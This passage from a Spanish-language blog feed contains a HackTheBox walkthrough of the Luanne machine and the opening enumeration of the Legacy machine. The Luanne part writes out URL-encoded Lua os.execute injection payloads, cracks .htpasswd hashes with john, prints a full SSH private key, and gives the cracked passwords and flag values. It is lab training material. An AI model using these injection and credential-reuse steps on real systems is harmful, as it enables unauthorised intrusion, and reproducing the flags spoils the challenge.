&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Recibimos la petición en &lt;code&gt;burpsuite&lt;/code&gt; y la mandamos al repeater.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora trataremos de realizar una inyección en la petición incorporando una &lt;code&gt;'&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ocasionamos un&lt;code&gt;luaerror&lt;/code&gt;, asi que podemos tratar de ejecutar un comando con &lt;code&gt;lua&lt;/code&gt;, usando &lt;code&gt;os.execute()&lt;/code&gt;. y comentando la query.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En principio, la inyección parece fallar, pero vamos a volver a enviarlo esta vez haciendo &lt;code&gt;urlencode&lt;/code&gt; y esta vez si vemos la ejecución correctamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo siguiente que haremos sera entablarnos una &lt;code&gt;revershell&lt;/code&gt; a nuestra maquina usando &lt;code&gt;mkfifo&lt;/code&gt; para que si tenemos una versión distinta de &lt;code&gt;ncat&lt;/code&gt; evitar inconenientes, para ello podemos usar la pagina web de confianza de &lt;code&gt;pentestmonkey&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Enviamos la petición, modificando nuestra ip, puerto en escucha y sin olvidar urlencodear la petición.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y recibimos la conexión en nuestra maquina como el usuario &lt;code&gt;httpd&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.218.
Ncat: Connection from 10.10.10.218:65479.
sh: can't access tty; job control turned off
$ whoami
_httpd
$ hostname
luanne.htb
$ uname -a  
NetBSD luanne.htb 9.0 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020  mkrepro@mkrepro.NetBSD.org:/usr/src/sys/arch/amd64/compile/GENERIC amd64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y vemos que si se corresponde a un &lt;code&gt;NetBSD&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ahora vamos a lista los procesos que se estan ejecutando en la maquina y obervamos una correspondiente al demonio de &lt;code&gt;httpd&lt;/code&gt;, por el puerto &lt;code&gt;3001&lt;/code&gt; que apunta a la ruta &lt;code&gt;weather&lt;/code&gt;similar a la que usamos para ganar acceso al sistema.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -u -X -s -i &quot;http://127.0.0.1:3000/weather/forecast?city=list'&quot;
Enter host password for user '-X':

HTTP/1.1 500 Error
Content-Type: application/json

&amp;lt;br&amp;gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value

curl -u -X -s -i &quot;http://127.0.0.1:3000/weather/forecast?city=list'%29%3B+os.execute%28%22id%22%29--%2B-&quot;
Enter host password for user '-X':

HTTP/1.1 500 Error
Content-Type: application/json

{&quot;code&quot;: 500,&quot;error&quot;: &quot;unknown city: listuid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
curl -u -X -s -i &quot;http://127.0.0.1:3000/weather/forecast?city=list'%29%3B+os.execute%28%22whoami%22%29--%2B-&quot;
Enter host password for user '-X':

HTTP/1.1 500 Error
Content-Type: application/json

{&quot;code&quot;: 500,&quot;error&quot;: &quot;unknown city: list_httpd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Observamos que tambien podemos ejecutar comandos, pero como el mismo usuario, asi que no nos serviria hacerlo. Pero vemos que en la ejecución del comando incorpora distintos parametros y podemos ver a que corresponde en &lt;code&gt;NETBSD&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Encontramos un articulo que nos explica a detalle el funcionamiento de los parametros.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://man.netbsd.org/NetBSD-9.3/i386/httpd.8&quot;&gt;https://man.netbsd.org/NetBSD-9.3/i386/httpd.8&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Entre los parametros que se utiliza en la petición, podemos ver que &lt;code&gt;-u&lt;/code&gt;, permite la transformación de localizadores uniformes de recursos de la forma &lt;code&gt;/~user/&lt;/code&gt; en el directorio &lt;code&gt;~user/public_html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora podemos aprovecharnos de esto, para lista los recursos del directorio &lt;code&gt;r.michaels&lt;/code&gt;, pero como realiza una autenticación, necesitamos credenciales y si listamos los archivos ocultos de nuestro directorio actual, podemos ver un archivo de nombre &lt;code&gt;.htpasswd&lt;/code&gt; que al leerlo se nos reporta un usuario con una contraeña hasheada que podemos intentar crackerla con &lt;code&gt;john&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ls -la
total 20
drwxr-xr-x   2 root  wheel  512 Nov 25  2020 .
drwxr-xr-x  24 root  wheel  512 Nov 24  2020 ..
-rw-r--r--   1 root  wheel   47 Sep 16  2020 .htpasswd
-rw-r--r--   1 root  wheel  386 Sep 17  2020 index.html
-rw-r--r--   1 root  wheel   78 Nov 25  2020 robots.txt
cat .htpasswd
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de realizar el crackeo &lt;code&gt;john&lt;/code&gt;, nos reporta la contraseña en texto claro, asi que ahora que contamos con credenciales validar &lt;code&gt;webapi_user:iamthebest&lt;/code&gt;, podemos usarlas en la petición.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -s -X GET &quot;http://127.0.0.1:3001/~r.michaels/&quot; -u 'webapi_user:iamthebest'
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;/&amp;gt;
&amp;lt;style type=&quot;text/css&quot;&amp;gt;
table {
	border-top: 1px solid black;
	border-bottom: 1px solid black;
}
th { background: aquamarine; }
tr:nth-child(even) { background: lavender; }
&amp;lt;/style&amp;gt;
&amp;lt;title&amp;gt;Index of ~r.michaels/&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Index of ~r.michaels/&amp;lt;/h1&amp;gt;
&amp;lt;table cols=3&amp;gt;
&amp;lt;thead&amp;gt;
&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Name&amp;lt;th&amp;gt;Last modified&amp;lt;th align=right&amp;gt;Size
&amp;lt;tbody&amp;gt;
&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=&quot;../&quot;&amp;gt;Parent Directory&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;16-Sep-2020 18:20&amp;lt;td align=right&amp;gt;1kB
&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=&quot;id_rsa&quot;&amp;gt;id_rsa&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;16-Sep-2020 16:52&amp;lt;td align=right&amp;gt;3kB
&amp;lt;/table&amp;gt;
&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esta vez podemos listar el contenido del usuario &lt;code&gt;r.michaels&lt;/code&gt; y dentro vemos su &lt;code&gt;id_rsa&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ahora tal y como nos dice el articulo de &lt;code&gt;NETBSD&lt;/code&gt;, podemos hacer uso del paramtro &lt;code&gt;-G&lt;/code&gt; para ver el output.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -s -X GET &quot;http://127.0.0.1:3001/~r.michaels/id_rsa&quot; -u 'webapi_user:iamthebest' -G id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya con la &lt;code&gt;id_rsa&lt;/code&gt; al estar abierto el puerto &lt;code&gt;22&lt;/code&gt;, podemos conectarnos como &lt;code&gt;r.michaels&lt;/code&gt;, sin proporcionar contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nvim id_rsa
❯ chmod 600 id_rsa
❯ ssh -i id_rsa r.michaels@10.10.10.218
The authenticity of host '10.10.10.218 (10.10.10.218)' can't be established.
ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.218' (ECDSA) to the list of known hosts.
Last login: Fri Sep 18 07:06:51 2020
NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020

Welcome to NetBSD!

luanne$ whoami
r.michaels
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visualizamos los archivos, del directorio y podemos leer la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;backups     devel       public_html user.txt
luanne$ cat user.txt                                                                                                                                                                  
ea5f0ce6a917b0be1eabc7f9218febc0
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Si listamos el directorio del usuario, obsevamos un directorio &lt;code&gt;backup&lt;/code&gt;, que dentro contiene un archivo tar encrpytado.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;luanne$ ls
backups     devel       public_html user.txt
luanne$ cd backups/                                                                                                                                                                   
luanne$ ls 
devel_backup-2020-09-16.tar.gz.enc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora en &lt;code&gt;NETBSD&lt;/code&gt;, existe una herramienta para decsencriptar estos archivos que corresponde ah &lt;code&gt;netpgp&lt;/code&gt;. Si ejecutamos la herramienta nos muestra el panel de ayuda para poder ejecutarla correctamente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;luanne$ netpgp
NetPGP portable 3.99.17/[20101103]
All bug reports, praise and chocolate, please, to:
Alistair Crooks &amp;lt;agc@netbsd.org&amp;gt; c0596823
Usage: netpgp COMMAND OPTIONS:
netpgp  --help OR
        --encrypt [--output=file] [options] files... OR
        --decrypt [--output=file] [options] files... OR

        --sign [--armor] [--detach] [--hash=alg] [--output=file]
                [options] files... OR
        --verify [options] files... OR
        --cat [--output=file] [options] files... OR
        --clearsign [--output=file] [options] files... OR
        --list-packets [options] OR
        --version
where options are:
        [--cipher=&amp;lt;ciphername&amp;gt;] AND/OR
        [--coredumps] AND/OR
        [--homedir=&amp;lt;homedir&amp;gt;] AND/OR
        [--keyring=&amp;lt;keyring&amp;gt;] AND/OR
        [--numtries=&amp;lt;attempts&amp;gt;] AND/OR
        [--userid=&amp;lt;userid&amp;gt;] AND/OR
        [--maxmemalloc=&amp;lt;number of bytes&amp;gt;] AND/OR
        [--verbose]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de decsencriptar el archivo, vamos a traernoslo a nuestro equipo para descromprimirlo, como no cuenta con &lt;code&gt;python&lt;/code&gt;, usaremos &lt;code&gt;nc&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo descomprimimos y dentro vemos otro archivo &lt;code&gt;.htpasswd&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 devel_backup-2020-09-16.tar.gz   id_rsa
❯ file devel_backup-2020-09-16.tar.gz
devel_backup-2020-09-16.tar.gz: gzip compressed data, last modified: Tue Nov 24 09:18:51 2020, from Unix, original size modulo 2^32 12288
❯ tar -xf devel_backup-2020-09-16.tar.gz
❯ ls
 devel-2020-09-16   devel_backup-2020-09-16.tar.gz   id_rsa
❯ cd devel-2020-09-16
❯ ls
 webapi   www
❯ tree -fas
.
├── [         22]  ./webapi
│   └── [       7072]  ./webapi/weather.lua
└── [         38]  ./www
    ├── [         47]  ./www/.htpasswd
    └── [        378]  ./www/index.html

2 directories, 3 files
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al leer el archivo, vemos una contraeña &lt;code&gt;hasheada&lt;/code&gt;, pero que es distinta a la obtuvimos previamente. Asi con john vamos a intentar crackear este otro &lt;code&gt;hash&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash2
Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
littlebear       (webapi_user)
1g 0:00:00:00 DONE (2023-06-29 18:21) 7.142g/s 93257p/s 93257c/s 93257C/s gamboa..hello11
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos una nueva contraseña &lt;code&gt;littlebear&lt;/code&gt;, que curiosamente corresponde a la del usuario &lt;code&gt;root&lt;/code&gt;, pero para migrar no podemos hacer uso de &lt;code&gt;su root&lt;/code&gt;, ya que en &lt;code&gt;NETBSD&lt;/code&gt; lo hacemos usando el comando &lt;code&gt;doas&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;luanne$ su root 
su: You are not listed in the correct secondary group (wheel) to su root.
su: Sorry: Authentication error
luanne$ doas sh
Password:
# whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finalmente solo debemos dirigirnos al directorio personal del usuario root y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt; y asi habriamos concluido.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# cd /root
# cat root.txt
7a9b5c206e8e8ba09bb99bd113675f66
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Thu, 29 Jun 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Luanne</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Luanne</guid>
        
        <category>NETBSD</category>
        
        <category>Api json explotation</category>
        
        <category>Lua Command Injection</category>
        
        <category>Abussing httpd Parameter</category>
        
        <category>Cracking Hashes</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Legacy - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Legacy&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; sencilla de dificultad facil, en la explotación vamos a repasar los conceptos para realizar una explotación manual de &lt;code&gt;eternal blue&lt;/code&gt; usando el &lt;code&gt;zzz_exploit.py&lt;/code&gt;, ademas de forma alternativa para explotar la maquina realizaremos una enumeración por &lt;code&gt;smb&lt;/code&gt; donde se nos reprotara que el servicio es vulnerable a el exploit &lt;code&gt;MS08_067&lt;/code&gt; el cual tambien explotaremos a traves de la creación de un &lt;code&gt;shellcode&lt;/code&gt; para asi obtener acceso como el usuario &lt;code&gt;adminsitrator&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Comenzaremos como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Legacy
❯ ls
 Legacy
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.4
PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=119 ms

--- 10.10.10.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 118.571/118.571/118.571/0.000 ms
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt; correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.4 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 18:54 GMT
Initiating SYN Stealth Scan at 18:54
Scanning 10.10.10.4 [65535 ports]
Discovered open port 139/tcp on 10.10.10.4
Discovered open port 445/tcp on 10.10.10.4
Discovered open port 135/tcp on 10.10.10.4
Completed SYN Stealth Scan at 18:55, 21.64s elapsed (65535 total ports)
Nmap scan report for 10.10.10.4
Host is up, received user-set (0.18s latency).
Scanned at 2023-06-29 18:54:52 GMT for 21s
Not shown: 56233 closed tcp ports (reset), 9299 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.77 seconds
           Raw packets sent: 106649 (4.693MB) | Rcvd: 65813 (2.633MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p135,139,445 10.10.10.4 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 18:56 GMT
Nmap scan report for 10.10.10.4
Host is up (0.18s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h27m34s, deviation: 2h07m16s, median: 4d22h57m34s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:50:56:b9:a9:4a (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-07-04T23:53:50+03:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.17 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina &lt;code&gt;Windows XP&lt;/code&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;RPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;139&lt;/td&gt;
      &lt;td&gt;LDAP&lt;/td&gt;
      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;445&lt;/td&gt;
      &lt;td&gt;SMB&lt;/td&gt;
      &lt;td&gt;Windows XP microsoft-ds&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

